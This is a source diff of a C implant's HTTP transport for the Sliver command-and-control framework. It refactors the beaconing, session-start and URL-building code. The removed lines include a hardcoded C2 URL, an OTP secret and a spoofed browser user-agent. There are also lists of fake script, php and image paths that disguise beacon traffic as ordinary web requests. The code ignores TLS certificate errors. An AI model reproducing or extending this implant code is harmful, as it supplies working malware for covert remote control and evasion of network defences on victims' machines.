@@ -260,16 +260,10 @@ PHTTP_SESSION HttpSessionInit
 	_In_ PURI pUri
 )
 {
-	WINHTTP_PROXY_INFO ProxyDefault;
-	LPWSTR lpProxyName = NULL;
-	LPWSTR lpProxyBypass = NULL;
-	PHTTP_SESSION Result;
-	LPWSTR lpHostName = NULL;
+	PHTTP_SESSION Result = NULL;
 	LPWSTR lpFullUri = NULL;
 
 	Result = ALLOC(sizeof(HTTP_SESSION));
-	SecureZeroMemory(&ProxyDefault, sizeof(ProxyDefault));
-	
 	Result->hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
 	if (!Result->hSession) {
 		LOG_ERROR("WinHttpOpen", GetLastError());
@@ -285,11 +279,7 @@ PHTTP_SESSION HttpSessionInit
 	}
 	
 CLEANUP:
-	FREE(lpHostName);
-	FREE(lpProxyName);
-	FREE(lpProxyBypass);
 	FREE(lpFullUri);
-
 	return Result;
 }
 
@@ -305,13 +295,21 @@ PHTTP_CLIENT HttpClientInit
 	Result = ALLOC(sizeof(HTTP_CLIENT));
 	Result->pUri = pUri;
 	Result->pHttpSession = HttpSessionInit(pUri);
+	if (Result->pHttpSession == NULL) {
+		FreeHttpClient(Result);
+		Result = NULL;
+		goto CLEANUP;
+	}
+
 	Result->hConnection = WinHttpConnect(Result->pHttpSession->hSession, lpHostName, pUri->wPort, 0);
 	if (Result->hConnection == NULL) {
 		LOG_ERROR("WinHttpConnect", GetLastError());
 		FreeHttpClient(Result);
 		Result = NULL;
+		goto CLEANUP;
 	}
 
+CLEANUP:
 	FREE(lpHostName);
 	return Result;
 }
@@ -405,54 +403,43 @@ HINTERNET SendRequest
 	i = 0;
 	while (!WinHttpSendRequest(hRequest, NULL, 0, pRequest->lpData, pRequest->cbData, pRequest->cbData, 0)) {
 		dwLastError = GetLastError();
+		LOG_ERROR("WinHttpSendRequest", dwLastError);
 		if (dwLastError == ERROR_WINHTTP_RESEND_REQUEST) {
 			continue;
 		}
 
-		if (dwLastError == ERROR_WINHTTP_TIMEOUT) {
-			hRequest = NULL;
-			goto CLEANUP;
-		}
-
-		LOG_ERROR("WinHttpSendRequest", dwLastError);
-		if (dwLastError == ERROR_WINHTTP_SECURE_FAILURE) {
-			dwFlag = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
-			if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlag, sizeof(dwFlag))) {
-				LOG_ERROR("WinHttpSetOption", GetLastError());
-				hRequest = NULL;
-				goto CLEANUP;
-			}
-		}
-
-		i++;
-		if (i > dwNumberOfAttemps) {
-			hRequest = NULL;
-			goto CLEANUP;
-		}
-	}
-
-	if (!WinHttpReceiveResponse(hRequest, NULL)) {
-		dwLastError = GetLastError();
 		if (dwLastError == ERROR_WINHTTP_TIMEOUT) {
 			WinHttpCloseHandle(hRequest);
 			hRequest = NULL;
 			goto CLEANUP;
 		}
 
-		LOG_ERROR("WinHttpReceiveResponse", dwLastError);
+		if (dwLastError == ERROR_WINHTTP_SECURE_FAILURE) {
+			dwFlag = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
+			WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlag, sizeof(dwFlag));
+			continue;
+		}
+
+		i++;
+		if (i > dwNumberOfAttemps) {
+			WinHttpCloseHandle(hRequest);
+			hRequest = NULL;
+			goto CLEANUP;
+		}
+	}
+
+	if (!WinHttpReceiveResponse(hRequest, NULL)) {
+		LOG_ERROR("WinHttpReceiveResponse", GetLastError());
 		WinHttpCloseHandle(hRequest);
 		hRequest = NULL;
 		goto CLEANUP;
 	}
+
 CLEANUP:
 	FREE(lpFullUri);
 	FREE(lpMethod);
 	FREE(pPath);
-	if (pProxyInfo != NULL) {
-		FREE(pProxyInfo->lpszProxy);
-		FREE(pProxyInfo->lpszProxyBypass);
-		FREE(pProxyInfo);
-	}
+	FreeWinHttpProxyInfo(pProxyInfo);
 
 	return hRequest;
 }
@@ -473,56 +460,57 @@ DWORD ReadStatusCode
 	return dwResult;
 }
 
-BOOL ReceiveData
+PBUFFER ReceiveData
 (
-	_In_ HINTERNET hRequest,
-	_Out_ PBYTE* pData,
-	_Out_ PDWORD pdwDataSize
+	_In_ HINTERNET hRequest
 )
 {
 	DWORD dwNumberOfBytesAvailable = 0;
-	BOOL bResult = FALSE;
-	PBYTE Buffer = NULL;
 	DWORD dwNumberOfBytesRead = 0;
-	DWORD dwTotalSize = 0;
+	PBUFFER pResult = NULL;
 
+	pResult = ALLOC(sizeof(BUFFER));
 	do {
 		dwNumberOfBytesAvailable = 0;
 		if (!WinHttpQueryDataAvailable(hRequest, &dwNumberOfBytesAvailable)) {
 			LOG_ERROR("WinHttpQueryDataAvailable", GetLastError());
-			goto END;
+			FreeBuffer(pResult);
+			pResult = NULL;
+			goto CLEANUP;
 		}
 
 		if (dwNumberOfBytesAvailable == 0) {
 			break;
 		}
 
-		if (Buffer == NULL) {
-			Buffer = ALLOC(dwNumberOfBytesAvailable);
+		if (pResult->pBuffer == NULL) {
+			pResult->pBuffer = ALLOC(dwNumberOfBytesAvailable);
 		}
 		else {
-			Buffer = REALLOC(Buffer, dwTotalSize + dwNumberOfBytesAvailable);
+			pResult->pBuffer = REALLOC(pResult->pBuffer, pResult->cbBuffer + dwNumberOfBytesAvailable);
 		}
 
 		dwNumberOfBytesRead = 0;
-		if (!WinHttpReadData(hRequest, &Buffer[dwTotalSize], dwNumberOfBytesAvailable, &dwNumberOfBytesRead)) {
+		if (!WinHttpReadData(hRequest, &pResult->pBuffer[pResult->cbBuffer], dwNumberOfBytesAvailable, &dwNumberOfBytesRead)) {
 			LOG_ERROR("WinHttpReadData", GetLastError());
-			goto END;
+			FreeBuffer(pResult);
+			pResult = NULL;
+			goto CLEANUP;
 		}
 
 		if (dwNumberOfBytesRead == 0) {
 			break;
 		}
 
-		dwTotalSize += dwNumberOfBytesRead;
+		pResult->cbBuffer += dwNumberOfBytesRead;
 	} while (dwNumberOfBytesAvailable > 0);
 
-	bResult = TRUE;
-	Buffer = REALLOC(Buffer, dwTotalSize + 1);
-	*pData = Buffer;
-	*pdwDataSize = dwTotalSize;
-END:
-	return bResult;
+	if (pResult->pBuffer != NULL) {
+		pResult->pBuffer = REALLOC(pResult->pBuffer, pResult->cbBuffer + 1);
+	}
+
+CLEANUP:
+	return pResult;
 }
 
 VOID FreeHttpSession
@@ -530,15 +518,8 @@ VOID FreeHttpSession
 	_In_ PHTTP_SESSION pHttpSession
 )
 {
-	PWINHTTP_PROXY_INFO pProxyInfo = NULL;
 	if (pHttpSession != NULL) {
-		pProxyInfo = pHttpSession->pProxyInfo;
-		if (pProxyInfo != NULL) {
-			FREE(pProxyInfo->lpszProxy);
-			FREE(pProxyInfo->lpszProxyBypass);
-			FREE(pProxyInfo);
-		}
-
+		FreeWinHttpProxyInfo(pHttpSession->pProxyInfo);
 		if (pHttpSession->hSession != NULL) {
 			WinHttpCloseHandle(pHttpSession->hSession);
 		}
@@ -636,9 +617,9 @@ PHTTP_RESP SendHttpRequest
 	HINTERNET hRequest = NULL;
 	DWORD dwStatusCode = 0;
 	DWORD i = 0;
-	DWORD cbResp = 0;
 	PHTTP_RESP pResult = NULL;
 	LPSTR lpAuthorizationHeader = NULL;
+	PBUFFER pReceivedData = NULL;
 
 	pHttpRequest = CreateHttpRequest(pHttpConfig, lpMethod, lpData, cbData);
 	for (i = 0; i < HeaderEnumEnd; i++) {
@@ -657,9 +638,8 @@ PHTTP_RESP SendHttpRequest
 	FREE(pHttpRequest->Headers[UserAgent]);
 	pHttpRequest->Headers[UserAgent] = DuplicateStrA(pHttpConfig->lpUserAgent, 0);
 	if (SetAuthorizationHeader) {
-		lpAuthorizationHeader = ALLOC(lstrlenA("Bearer ") + lstrlenA(pHttpConfig->lpAccessToken) + 1);
-		StrCpyA(lpAuthorizationHeader, "Bearer ");
-		StrCatA(lpAuthorizationHeader, pHttpConfig->lpAccessToken);
+		lpAuthorizationHeader = DuplicateStrA("Bearer ", lstrlenA(pHttpConfig->lpAccessToken));
+		lstrcatA(lpAuthorizationHeader, pHttpConfig->lpAccessToken);
 		FREE(pHttpRequest->Headers[Authorization]);
 		pHttpRequest->Headers[Authorization] = lpAuthorizationHeader;
 	}
@@ -677,89 +657,36 @@ PHTTP_RESP SendHttpRequest
 	pResult = ALLOC(sizeof(HTTP_RESP));
 	dwStatusCode = ReadStatusCode(hRequest);
 	if ((dwStatusCode == HTTP_STATUS_OK || dwStatusCode == HTTP_STATUS_ACCEPTED) && GetRespData) {
-		if (!ReceiveData(hRequest, &pResult->pRespData, &cbResp)) {
-			FREE(pResult->pRespData);
-			pResult->pRespData = NULL;
-			cbResp = 0;
-		}
+		pReceivedData = ReceiveData(hRequest);
+		pResult->cbResp = pReceivedData->cbBuffer;
+		pResult->pRespData = pReceivedData->pBuffer;
+		pReceivedData->pBuffer = NULL;
 	}
 
 	pResult->hRequest = hRequest;
-	pResult->cbResp = cbResp;
 	pResult->dwStatusCode = dwStatusCode;
 CLEANUP:
 	FreeHttpRequest(pHttpRequest);
+	FreeBuffer(pReceivedData);
 
 	return pResult;
 };
 
-PSLIVER_HTTP_CLIENT HttpInit()
+PSLIVER_HTTP_CLIENT HttpInit
+(
+	_In_ PHTTP_PROFILE pProfile
+)
 {
 	PSLIVER_HTTP_CLIENT pResult = NULL;
-	BOOL IsOk = FALSE;
-	LPSTR lpEncodedSessionKey = NULL;
-
-	// Tu dinh config --------------------------------------------------------------------
-	CHAR szUri[] = "http://ubuntu-icefrog2000.com";
-	LPSTR PollPaths[] = { "script", "javascripts", "javascript", "jscript", "js", "umd" };
-	LPSTR PollFiles[] = { "jquery", "route", "app" };
-	LPSTR SessionPaths[] = { "upload", "actions" };
-	LPSTR SessionFiles[] = { "samples", "api" };
-	LPSTR ClosePaths[] = { "assets", "images" };
-	LPSTR CloseFiles[] = { "example", "favicon" };
-	CHAR szUserAgent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9265.982 Safari/537.36";
-	CHAR szOtpSecret[] = "GQH4RBUBSOLX446N2CBCS7AYHYLBMA2A";
-
-	DWORD i = 0;
 
 	pResult = ALLOC(sizeof(SLIVER_HTTP_CLIENT));
 	pResult->pHttpConfig = ALLOC(sizeof(HTTP_CONFIG));
-	pResult->pHttpConfig->lpUserAgent = DuplicateStrA(szUserAgent, 0);
+	pResult->pHttpConfig->lpUserAgent = DuplicateStrA(pProfile->lpUserAgent, 0);
 	pResult->pHttpConfig->dwNumberOfAttemps = 10;
-	pResult->OtpData.lpBase32Secret = DuplicateStrA(szOtpSecret, 0);
+	pResult->OtpData.lpBase32Secret = DuplicateStrA(pProfile->lpOtpSecret, 0);
 	pResult->OtpData.dwInterval = 30;
 	pResult->OtpData.dwDigits = 8;
-	pResult->cPollPaths = _countof(PollPaths);
-	for (i = 0; i < _countof(PollPaths); i++) {
-		pResult->PollPaths[i] = DuplicateStrA(PollPaths[i], 0);
-	}
-
-	pResult->cPollFiles = _countof(PollFiles);
-	for (i = 0; i < _countof(PollFiles); i++) {
-		pResult->PollFiles[i] = DuplicateStrA(PollFiles[i], 0);
-	}
-
-	pResult->cSessionFiles = _countof(SessionFiles);
-	for (i = 0; i < _countof(SessionFiles); i++) {
-		pResult->SessionFiles[i] = DuplicateStrA(SessionFiles[i], 0);
-	}
-
-	pResult->cSessionPaths = _countof(SessionPaths);
-	for (i = 0; i < _countof(SessionPaths); i++) {
-		pResult->SessionPaths[i] = DuplicateStrA(SessionPaths[i], 0);
-	}
-
-	pResult->cCloseFiles = _countof(CloseFiles);
-	for (i = 0; i < _countof(CloseFiles); i++) {
-		pResult->CloseFiles[i] = DuplicateStrA(CloseFiles[i], 0);
-	}
-
-	pResult->cClosePaths = _countof(ClosePaths);
-	for (i = 0; i < _countof(ClosePaths); i++) {
-		pResult->ClosePaths[i] = DuplicateStrA(ClosePaths[i], 0);
-	}
-
-	pResult->dwMinNumOfSegments = 2;
-	pResult->dwMaxNumOfSegments = 4;
-	pResult->dwPollInterval = 3;
-	pResult->UseStandardPort = TRUE;
-	pResult->lpHostName = DuplicateStrA(szUri, 0);
-	IsOk = TRUE;
-CLEANUP:
-	FREE(lpEncodedSessionKey);
-	if (!IsOk && pResult != NULL) {
-		FreeHttpClient(pResult);
-	}
+	pResult->pProfile = pProfile;
 
 	return pResult;
 }
@@ -846,10 +773,6 @@ BOOL HttpSend
 	pMarshaledEnvelope = MarshalEnvelope(pEnvelope);
 	pCipherText = SliverEncrypt(pConfig->pSessionKey, pMarshaledEnvelope);
 	lpUri = CreateSessionURL(pConfig, pHttpClient);
-	if (lpUri == NULL) {
-		goto CLEANUP;
-	}
-
 	pUri = UriInit(lpUri);
 	if (pUri == NULL) {
 		goto CLEANUP;
@@ -880,8 +803,8 @@ BOOL HttpClose
 {
 	PHTTP_CLIENT pHttpClient = NULL;
 
-	if (pSliverHttpClient != NULL && pSliverHttpClient->pHttpClient != NULL) {
-		pHttpClient = pSliverHttpClient->pHttpClient;
+	pHttpClient = pSliverHttpClient->pHttpClient;
+	if (pSliverHttpClient != NULL && pHttpClient != NULL) {
 		if (pHttpClient->hConnection != NULL) {
 			WinHttpCloseHandle(pHttpClient->hConnection);
 			pHttpClient->hConnection = NULL;
@@ -918,34 +841,8 @@ BOOL HttpCleanup
 	_In_ PSLIVER_HTTP_CLIENT pSliverHttpClient
 )
 {
-	DWORD i = 0;
 	if (pSliverHttpClient != NULL) {
 		FREE(pSliverHttpClient->lpPathPrefix);
-		FREE(pSliverHttpClient->lpHostName);
-		for (i = 0; i < _countof(pSliverHttpClient->PollPaths); i++) {
-			FREE(pSliverHttpClient->PollPaths[i]);
-		}
-
-		for (i = 0; i < _countof(pSliverHttpClient->PollFiles); i++) {
-			FREE(pSliverHttpClient->PollFiles[i]);
-		}
-
-		for (i = 0; i < _countof(pSliverHttpClient->SessionPaths); i++) {
-			FREE(pSliverHttpClient->SessionPaths[i]);
-		}
-
-		for (i = 0; i < _countof(pSliverHttpClient->SessionFiles); i++) {
-			FREE(pSliverHttpClient->SessionFiles[i]);
-		}
-
-		for (i = 0; i < _countof(pSliverHttpClient->ClosePaths); i++) {
-			FREE(pSliverHttpClient->ClosePaths[i]);
-		}
-
-		for (i = 0; i < _countof(pSliverHttpClient->CloseFiles); i++) {
-			FREE(pSliverHttpClient->CloseFiles[i]);
-		}
-
 		FREE(pSliverHttpClient->OtpData.lpBase32Secret);
 		FreeHttpConfig(pSliverHttpClient->pHttpConfig);
 		FreeHttpClient(pSliverHttpClient->pHttpClient);
@@ -971,7 +868,6 @@ BOOL HttpStart
 	DWORD cbDecodedResp = 0;
 	PBUFFER pSessionId = NULL;
 	PBYTE pEncryptedSessionInit = NULL;
-	LPSTR lpRespData = NULL;
 	DWORD cbEncryptedSessionInit = 0;
 	PPBElement pMarshaledData = NULL;
 	DWORD dwSetCookieLength = 0;
@@ -1007,11 +903,10 @@ BOOL HttpStart
 		goto CLEANUP;
 	}
 
-	lpRespData = ExtractSubStrA(pResp->pRespData, pResp->cbResp);
-	pDecodedResp = Base64Decode(lpRespData);
+	pDecodedResp = Base64Decode(pResp->pRespData);
 	pSessionId = SliverDecrypt(pConfig->pSessionKey, pDecodedResp);
-	memcpy(pConfig->szSessionID, pSessionId->pBuffer, pSessionId->cbBuffer);
-	pConfig->szSessionID[sizeof(pConfig->szSessionID) - 1] = '\0';
+	memcpy(pConfig->szSessionID, pSessionId->pBuffer, 0x20);
+	pConfig->szSessionID[0x20] = '\0';
 	dwSetCookieLength = sizeof(wszSetCookie);
 	if (!WinHttpQueryHeaders(pResp->hRequest, WINHTTP_QUERY_SET_COOKIE, NULL, wszSetCookie, &dwSetCookieLength, WINHTTP_NO_HEADER_INDEX)) {
 		LOG_ERROR("WinHttpQueryHeaders", GetLastError());
@@ -1025,7 +920,6 @@ BOOL HttpStart
 	wsprintfA(pHttpClient->pHttpConfig->AdditionalHeaders[Cookie], "%s=%s", lpCookiePrefix, pConfig->szSessionID);
 	Result = TRUE;
 CLEANUP:
-	FREE(lpRespData);
 	FREE(lpEncodedSessionKey);
 	FREE(lpFullUri);
 	FREE(lpCookiePrefix);
@@ -1100,10 +994,11 @@ LPSTR* RandomUrlPath
 	DWORD cResult = 0;
 	LPSTR lpFileName = NULL;
 	DWORD cbFileName = 0;
+	PHTTP_PROFILE pProfile = pClient->pProfile;
 
-	pResult = ALLOC((pClient->dwMaxNumOfSegments + 1) * sizeof(LPSTR));
+	pResult = ALLOC((pProfile->dwMaxNumberOfSegments + 1) * sizeof(LPSTR));
 	if (cSegments > 0) {
-		dwCountOfSegments = GenRandomNumber32(pClient->dwMinNumOfSegments, pClient->dwMaxNumOfSegments);
+		dwCountOfSegments = GenRandomNumber32(pProfile->dwMinNumberOfSegments, pProfile->dwMaxNumberOfSegments);
 		for (i = 0; i < dwCountOfSegments; i++) {
 			pResult[cResult++] = DuplicateStrA(pSegments[GenRandomNumber32(0, cSegments)], 0);
 		}
@@ -1131,15 +1026,16 @@ LPSTR ParseSegmentsUrl
 	LPSTR* pSegments = NULL;
 	DWORD i = 0;
 	LPSTR lpResult = NULL;
+	PHTTP_PROFILE pProfile = pClient->pProfile;
 
 	if (SegmentType == PollType) {
-		pSegments = RandomUrlPath(pClient, pClient->PollPaths, pClient->cPollPaths, pClient->PollFiles, pClient->cPollFiles, "js", &dwNumOfSegments);
+		pSegments = RandomUrlPath(pClient, pProfile->PollPaths, pProfile->cPollPaths, pProfile->PollFiles, pProfile->cPollFiles, "js", &dwNumOfSegments);
 	}
 	else if (SegmentType == SessionType) {
-		pSegments = RandomUrlPath(pClient, pClient->SessionPaths, pClient->cSessionPaths, pClient->SessionFiles, pClient->cSessionFiles, "php", &dwNumOfSegments);
+		pSegments = RandomUrlPath(pClient, pProfile->SessionPaths, pProfile->cSessionPaths, pProfile->SessionFiles, pProfile->cSessionFiles, "php", &dwNumOfSegments);
 	}
 	else if (SegmentType == CloseType) {
-		pSegments = RandomUrlPath(pClient, pClient->ClosePaths, pClient->cClosePaths, pClient->CloseFiles, pClient->cCloseFiles, "png", &dwNumOfSegments);
+		pSegments = RandomUrlPath(pClient, pProfile->ClosePaths, pProfile->cClosePaths, pProfile->CloseFiles, pProfile->cCloseFiles, "png", &dwNumOfSegments);
 	}
 	else {
 		goto CLEANUP;
@@ -1225,7 +1121,7 @@ LPSTR CreatePollURL
 	LPSTR lpNonce = NULL;
 
 	lpUrlPath = ParseSegmentsUrl(pClient, PollType);
-	lpResult = DuplicateStrA(pClient->lpHostName, lstrlenA(lpUrlPath) + 100);
+	lpResult = DuplicateStrA(pClient->pProfile->lpUrl, lstrlenA(lpUrlPath) + 100);
 	lstrcatA(lpResult, "/");
 	lstrcatA(lpResult, lpUrlPath);
 	lstrcatA(lpResult, "?");
@@ -1249,7 +1145,7 @@ LPSTR CreateSessionURL
 	LPSTR lpNonce = NULL;
 
 	lpUrlPath = ParseSegmentsUrl(pClient, SessionType);
-	lpResult = DuplicateStrA(pClient->lpHostName, lstrlenA(lpUrlPath) + 100);
+	lpResult = DuplicateStrA(pClient->pProfile->lpUrl, lstrlenA(lpUrlPath) + 100);
 	lstrcatA(lpResult, "/");
 	lstrcatA(lpResult, lpUrlPath);
 	lstrcatA(lpResult, "?");
@@ -1265,7 +1161,7 @@ CLEANUP:
 LPSTR StartSessionURL
 (
 	_In_ PGLOBAL_CONFIG pConfig,
-	_In_ PSLIVER_HTTP_CLIENT pHttpClient
+	_In_ PSLIVER_HTTP_CLIENT pClient
 )
 {
 	LPSTR lpUrlPath = NULL;
@@ -1275,19 +1171,19 @@ LPSTR StartSessionURL
 	LPSTR lpOtpQuery = NULL;
 	UINT64 uOtpCode = 0;
 
-	lpUrlPath = ParseSegmentsUrl(pHttpClient, SessionType);
+	lpUrlPath = ParseSegmentsUrl(pClient, SessionType);
 	lpTemp = TrimSuffixA(lpUrlPath, "php", FALSE);
 	FREE(lpUrlPath);
 	lpUrlPath = lpTemp;
 	lpUrlPath = REALLOC(lpUrlPath, lstrlenA(lpUrlPath) + 5);
 	lstrcatA(lpUrlPath, "html");
-	lpResult = DuplicateStrA(pHttpClient->lpHostName, lstrlenA(lpUrlPath) + 100);
+	lpResult = DuplicateStrA(pClient->pProfile->lpUrl, lstrlenA(lpUrlPath) + 100);
 	lstrcatA(lpResult, "/");
 	lstrcatA(lpResult, lpUrlPath);
 	lstrcatA(lpResult, "?");
 	lpNonceQuery = NonceQueryArgument(pConfig->uEncoderNonce);
 	lstrcatA(lpResult, lpNonceQuery);
-	uOtpCode = GetOtpNow(&pHttpClient->OtpData);
+	uOtpCode = GetOtpNow(&pClient->OtpData);
 	lpOtpQuery = OtpQueryArgument(uOtpCode);
 	lstrcatA(lpResult, "&");
 	lstrcatA(lpResult, lpOtpQuery);
